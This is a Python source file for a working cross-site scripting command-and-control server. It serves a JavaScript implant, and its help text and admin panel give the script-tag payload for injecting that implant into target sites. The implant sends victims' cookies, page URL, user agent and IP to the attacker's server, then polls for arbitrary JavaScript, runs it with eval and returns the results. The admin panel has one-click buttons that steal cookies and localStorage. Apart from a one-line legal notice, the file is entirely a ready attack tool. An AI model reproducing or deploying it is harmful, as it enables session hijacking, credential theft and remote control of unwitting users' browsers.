from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse
from datetime import datetime
import argparse
import sys

class C2Handler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.commands_queue = []
        self.results = []
        super().__init__(*args, **kwargs)
    
    def do_OPTIONS(self):
        # Handle CORS preflight
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def send_cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    
    def log_message(self, format, *args):
        timestamp = datetime.now().strftime("%H:%M:%S")
        client_ip = self.client_address[0]
        print(f"[{timestamp}] {client_ip} - {format % args}")
    
    def do_GET(self):
        server_ip = self.server.server_address[0]
        server_port = self.server.server_address[1]
        
        if self.path == '/cmd.js' or self.path.startswith('/cmd.js?'):
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.send_cors_headers()
            self.end_headers()
            
            loader = f"""// C2 Client - Port {server_port}
console.log('[C2-{server_port}] Starting on port {server_port}...');

// Get client IP (approximate)
function getClientIP() {{
    return new Promise((resolve) => {{
        // Try to get IP via WebRTC (if available)
        if (window.RTCPeerConnection) {{
            const pc = new RTCPeerConnection({{iceServers:[]}});
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {{
                if (ice && ice.candidate && ice.candidate.candidate) {{
                    const ip = ice.candidate.candidate.split(' ')[4];
                    if (ip) resolve(ip);
                }}
            }};
            setTimeout(() => resolve('unknown'), 1000);
        }} else {{
            resolve('unknown');
        }}
    }});
}}

// Immediate recon with IP
getClientIP().then(ip => {{
    fetch('http://{server_ip}:{server_port}/recon', {{
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({{
            url: window.location.href,
            cookies: document.cookie,
            domain: document.domain,
            userAgent: navigator.userAgent,
            clientIP: ip,
            status: 'CONNECTED_PORT_{server_port}',
            timestamp: new Date().toISOString()
        }})
    }});
}});

// Command execution
function execCmd(cmd) {{
    try {{
        let result = eval(cmd);
        if (result === null || result === undefined) return 'null';
        if (typeof result === 'object') return JSON.stringify(result);
        return String(result);
    }} catch(e) {{
        return 'ERROR: ' + e.message;
    }}
}}

// Main loop
async function commandLoop() {{
    while(true) {{
        try {{
            let response = await fetch('http://{server_ip}:{server_port}/get_command');
            let command = await response.text();
            
            if (command && command !== 'wait' && command !== 'null') {{
                console.log('[C2-{server_port}] Executing:', command);
                let result = execCmd(command);
                
                // Send result back
                await fetch('http://{server_ip}:{server_port}/result', {{
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({{
                        cmd: command,
                        result: result,
                        url: window.location.href,
                        ip: await getClientIP()
                    }})
                }});
            }}
        }} catch(error) {{
            // Silent retry
        }}
        await new Promise(resolve => setTimeout(resolve, 3000));
    }}
}}

// Start the loop
commandLoop();
"""
            self.wfile.write(loader.encode())
            
        elif self.path == '/get_command':
            self.send_response(200)
            self.send_cors_headers()
            self.end_headers()
            cmd = self.commands_queue.pop(0) if self.commands_queue else 'wait'
            self.wfile.write(cmd.encode())
            
        elif self.path == '/admin':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS C2 - PORT {server_port}</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .command-area {{ background: white; padding: 20px; border-radius: 10px; margin: 20px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        textarea {{ width: 100%; padding: 12px; font-family: monospace; border: 2px solid #ddd; border-radius: 5px; resize: vertical; }}
        textarea:focus {{ border-color: #667eea; outline: none; }}
        button {{ margin: 5px; padding: 10px 20px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: all 0.3s; }}
        button:hover {{ background: #764ba2; transform: translateY(-2px); box-shadow: 0 2px 4px rgba(0,0,0,0.2); }}
        #results {{ border: 2px solid #ddd; padding: 20px; height: 400px; overflow-y: scroll; background: white; border-radius: 10px; font-family: monospace; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .result-item {{ margin: 15px 0; padding: 15px; border-left: 5px solid #667eea; background: #f8f9fa; border-radius: 5px; }}
        .victim-info {{ background: #e8f5e8; padding: 15px; border-radius: 10px; margin: 15px 0; }}
        .stats {{ display: flex; gap: 15px; margin: 15px 0; }}
        .stat-box {{ background: white; padding: 15px; border-radius: 10px; flex: 1; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
    </style>
</head>
<body>
    <div class="header">
        <h2>🆕 XSS C2 Control - PORT {server_port}</h2>
        <div>🚀 Server: http://{server_ip}:{server_port}</div>
        <div>✅ Clean port with IP tracking</div>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>📊 Commands Sent</h3>
            <div id="commandCount">0</div>
        </div>
        <div class="stat-box">
            <h3>👥 Active Victims</h3>
            <div id="victimCount">0</div>
        </div>
        <div class="stat-box">
            <h3>🕒 Last Activity</h3>
            <div id="lastActivity">Never</div>
        </div>
    </div>

    <div class="command-area">
        <h3>🎯 Send Command to Victim:</h3>
        <form id="commandForm">
            <textarea name="command" rows="4" placeholder="JavaScript command to execute on victim" id="commandInput"></textarea><br>
            <button type="submit">🚀 Execute Command</button>
        </form>
    </div>

    <div class="command-area">
        <h3>⚡ Quick Commands:</h3>
        <button onclick="sendQuickCommand('document.cookie')">🍪 Get Cookies</button>
        <button onclick="sendQuickCommand('document.domain')">🌐 Get Domain</button>
        <button onclick="sendQuickCommand('location.href')">🔗 Get URL</button>
        <button onclick="sendQuickCommand('navigator.userAgent')">🖥️ Get User Agent</button>
        <button onclick="sendQuickCommand('alert(\\"C2-{server_port} Active\\")')">⚠️ Test Alert</button>
        <button onclick="sendQuickCommand('JSON.stringify({{forms: document.forms.length, links: document.links.length, images: document.images.length}})')">📊 Page Info</button>
        <button onclick="sendQuickCommand('localStorage.length > 0 ? JSON.stringify(localStorage) : \\"No localStorage\\"')">💾 Get LocalStorage</button>
    </div>

    <h3>📋 Command Results:</h3>
    <div id="results">
        <div>No results yet. Send a command to victim...</div>
    </div>

    <script>
        const commandForm = document.getElementById('commandForm');
        const commandInput = document.getElementById('commandInput');
        const resultsDiv = document.getElementById('results');
        const commandCount = document.getElementById('commandCount');
        const victimCount = document.getElementById('victimCount');
        const lastActivity = document.getElementById('lastActivity');

        let commandsSent = 0;
        let victimsSeen = new Set();

        // Handle form submission
        commandForm.addEventListener('submit', function(e) {{
            e.preventDefault();
            const command = commandInput.value.trim();
            if (command) {{
                sendCommand(command);
                commandInput.value = '';
                commandsSent++;
                commandCount.textContent = commandsSent;
                lastActivity.textContent = new Date().toLocaleTimeString();
            }}
        }});

        // Send command to server
        function sendCommand(command) {{
            fetch('/add_command', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/x-www-form-urlencoded',
                }},
                body: 'command=' + encodeURIComponent(command)
            }})
            .then(response => {{
                console.log('Command sent:', command);
                refreshResults();
            }})
            .catch(error => {{
                console.error('Error sending command:', error);
            }});
        }}

        // Quick command buttons
        function sendQuickCommand(cmd) {{
            commandInput.value = cmd;
            sendCommand(cmd);
        }}

        // Refresh results
        function refreshResults() {{
            fetch('/get_results')
                .then(response => response.text())
                .then(html => {{
                    resultsDiv.innerHTML = html;
                    resultsDiv.scrollTop = resultsDiv.scrollHeight;
                    
                    // Update victim count from results
                    const victimItems = html.match(/\\[(\\d+\\.\\d+\\.\\d+\\.\\d+)\\]/g) || [];
                    victimItems.forEach(ip => {{
                        victimsSeen.add(ip);
                    }});
                    victimCount.textContent = victimsSeen.size;
                }})
                .catch(error => {{
                    console.error('Error refreshing results:', error);
                }});
        }}

        // Auto-refresh every 2 seconds
        setInterval(refreshResults, 2000);
        refreshResults();
        lastActivity.textContent = new Date().toLocaleTimeString();
    </script>
</body>
</html>
"""
            self.wfile.write(html.encode())
            
        elif self.path == '/get_results':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            if self.results:
                results_html = ""
                for r in self.results[-15:]:
                    # Extract IP from result if present
                    ip_display = f"[{r.get('client_ip', 'unknown')}]" if 'client_ip' in r else ""
                    
                    results_html += f"""
                    <div class="result-item">
                        <strong>🕒 [{r['time']}] {ip_display}</strong><br>
                        <strong>🎯 Command:</strong> {r['cmd']}<br>
                        <strong>📦 Result:</strong> <span style="color: #2196F3;">{r['result']}</span>
                    </div>
                    """
            else:
                results_html = f"""
                <div style="color: #FF5722; padding: 30px; text-align: center; background: #fff3e0; border-radius: 10px;">
                    <h3>⏳ Waiting for victim connections...</h3>
                    <p>Inject the XSS payload on the target website and wait for victims to connect.</p>
                    <p>XSS Payload: <code>&lt;script src="http://{server_ip}:{server_port}/cmd.js"&gt;&lt;/script&gt;</code></p>
                </div>
                """
            
            self.wfile.write(results_html.encode())
            
        else:
            self.send_response(200)
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(b'OK')
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length) if length > 0 else b''
        client_ip = self.client_address[0]
        
        self.send_response(200)
        self.send_cors_headers()
        self.end_headers()
        
        if self.path == '/recon':
            try:
                data = json.loads(post_data) if post_data else {}
                print("🎯 NEW VICTIM CONNECTED!")
                print(f"📍 CLIENT IP: {client_ip}")
                print(f"🌐 URL: {data.get('url', 'N/A')}")
                print(f"🍪 Cookies: {data.get('cookies', 'N/A')}")
                print(f"🖥️ User-Agent: {data.get('userAgent', 'N/A')}")
                print(f"🌍 Browser IP: {data.get('clientIP', 'N/A')}")
                print("=" * 70)
                
                # Store client IP with results
                recon_entry = {
                    'time': datetime.now().strftime("%H:%M:%S"),
                    'cmd': 'RECON',
                    'result': f"New victim - URL: {data.get('url', 'N/A')} | IP: {client_ip}",
                    'client_ip': client_ip
                }
                self.results.append(recon_entry)
                
            except Exception as e:
                print(f"📨 Raw recon data from {client_ip}: {post_data.decode()}")
                
        elif self.path == '/result':
            try:
                data = json.loads(post_data) if post_data else {}
                result_entry = {
                    'time': datetime.now().strftime("%H:%M:%S"),
                    'cmd': data.get('cmd', 'unknown'),
                    'result': str(data.get('result', 'no result'))[:500],
                    'client_ip': client_ip
                }
                self.results.append(result_entry)
                print(f"📡 COMMAND EXECUTED from {client_ip}: {result_entry['cmd']}")
                print(f"📦 RESULT: {result_entry['result']}")
                print("-" * 70)
            except Exception as e:
                print(f"📨 Raw result data from {client_ip}: {post_data.decode()}")
                
        elif self.path == '/add_command':
            try:
                command = urllib.parse.parse_qs(post_data.decode()).get('command', [''])[0]
                if command:
                    self.commands_queue.append(command)
                    print(f"✅ COMMAND QUEUED by {client_ip}: {command}")
            except Exception as e:
                print(f"📨 Raw command data from {client_ip}: {post_data.decode()}")

def run_server(host='0.0.0.0', port=4545):
    server = HTTPServer((host, port), C2Handler)
    print(f"🚀 XSS C2 Server running on http://{host}:{port}")
    print(f"📋 Control Panel: http://{host}:{port}/admin")
    print(f"📍 Port {port} - With IP tracking and enhanced UI")
    print("⏳ Waiting for victim connections...")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n⏹️  Server stopped by user")
    except Exception as e:
        print(f"❌ Server error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description='🕷️ XSS C2 Server - Command and Control server for XSS attacks',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
📖 **USAGE EXAMPLES:**

  Start with default parameters:
    {sys.argv[0]}

  Start with custom IP and port:
    {sys.argv[0]} -h 192.168.1.100 -p 8080

  Only specify port:
    {sys.argv[0]} -p 9000

  Only specify host:
    {sys.argv[0]} -h 10.0.0.5

🎯 **XSS PAYLOAD FOR INJECTION:**
  <script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>

🛡️ **LEGAL NOTICE:** Use only for educational purposes or on systems you own.
   Illegal use is strictly prohibited.
        '''
    )
    
    parser.add_argument('-h', '--host', 
                       dest='host',
                       default='0.0.0.0', 
                       help='Server IP address (default: 0.0.0.0 - all interfaces)')
    
    parser.add_argument('-p', '--port', 
                       dest='port',
                       type=int, 
                       default=4545, 
                       help='Server port (default: 4545)')
    
    args = parser.parse_args()
    
    # Validate port range
    if not (1 <= args.port <= 65535):
        print("❌ Error: Port must be in range 1-65535")
        sys.exit(1)
    
    print(f"🔧 Starting server with configuration:")
    print(f"   📍 Host: {args.host}")
    print(f"   🚪 Port: {args.port}")
    print("-" * 50)
    
    run_server(args.host, args.port)

if __name__ == '__main__':
    main()
